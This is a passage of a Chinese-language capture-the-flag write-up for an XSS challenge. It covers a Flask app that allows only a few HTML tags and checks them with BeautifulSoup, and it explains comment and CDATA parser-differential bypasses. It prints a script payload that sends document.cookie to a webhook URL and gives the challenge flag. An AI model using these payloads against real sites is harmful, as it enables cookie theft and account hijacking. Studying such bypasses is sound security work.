RUN /usr/sbin/useradd -u 1000 user

RUN python3 -m pip install flask gunicorn beautifulsoup4

COPY chal.py /home/user/
COPY home.html /home/user/

EXPOSE 1337
RUN echo "cd /home/user && env WEB_CONCURRENCY=8 python3 -m gunicorn -b 0.0.0.0:1337 \"chal:app\"" > /home/user/run.sh
RUN chmod +x /home/user/run.sh
CMD ["bash", "/home/user/run.sh"]
#CMD ["bash"]
```
:::

:::spoiler tagged.py
```python
from flask import Flask, request, redirect
from bs4 import BeautifulSoup
import secrets
import base64

app = Flask(__name__)
SAFE_TAGS = ['i', 'b', 'p', 'br']

with open("home.html") as home:
    HOME_PAGE = home.read()

@app.route("/")
def home():
    return HOME_PAGE

@app.route("/add", methods=['POST'])
def add():
    contents = request.form.get('contents', "").encode()
    
    return redirect("/page?contents=" + base64.urlsafe_b64encode(contents).decode())

@app.route("/page")
def page():
    contents = base64.urlsafe_b64decode(request.args.get('contents', '')).decode()
    
    tree = BeautifulSoup(contents)
    for element in tree.find_all():
        if element.name not in SAFE_TAGS or len(element.attrs) > 0:
            return "This HTML looks sus."

    return f"<!DOCTYPE html><html><body>{str(tree)}</body></html>"
```
:::

可以看到，這是一個可以塞入 html 的網頁，但是在伺服器端有限制標籤只能塞 `<i>`, `<b>`, `<p>`, `<br>` 這四種，且在 Dockerfile 中可看到檢查用的函式庫 beautifulsoup 是最新版本，推測不是 cve 漏洞題

此外從題目敘述可推知這是一題前端題，且需要偷 cookie 資訊

以下參考[別人的解法](https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md)

在 [HTML5 spec](https://html.spec.whatwg.org/multipage/syntax.html#comments) 中，comment `<!-- -->` 中間可以添加文字，但是不能是 `>` 開頭，否則會被當作是一個有效的 tag block，但是經實測在 beautifulsoup 的分析中並沒有考慮到這種狀況，因此造成處理上的差異

因此考慮以下 payload

```htmlembedded
<!--><script>alert(1);</script><-->
```

在瀏覽器上會解析出 script 標籤，但是在 beautifulsoup 中會檢測不出來

因此可以透過以下 payload 將 cookie 偷出來

```htmlembedded
<!--><script>fetch('https://webhook.site/df032aab-0719-432e-a649-ef2618eb8f16/?cookie='+document.cookie);</script><-->
```

以下是另一個別人的解法
![](https://i.imgur.com/QCIguX8.png)

在 xml 中有一個叫做 cdata 的東西，而一般瀏覽器雖然是吃 html 但其實也會處理 cdata 的部分 (html5 spec 有定義)，但是在 beautifulsoup 的預設模式 `http.parser` 並不會處理此部分反而會直接省略 (但 `lxml` 可正常解析，參考 [reference](https://groups.google.com/g/beautifulsoup/c/2yMjUYTIaiQ?pli=1))，造成處理上的差異

因此用上面類似，只要使用 cdata 包起來即可 (注意 script 前有一個 `>`，避免瀏覽器解析上的問題)

```htmlembedded
<![CDATA[><script>alert(1);</script>]]>
```

偷 cookie 部分不再贅述

`irisctf{security_by_option}`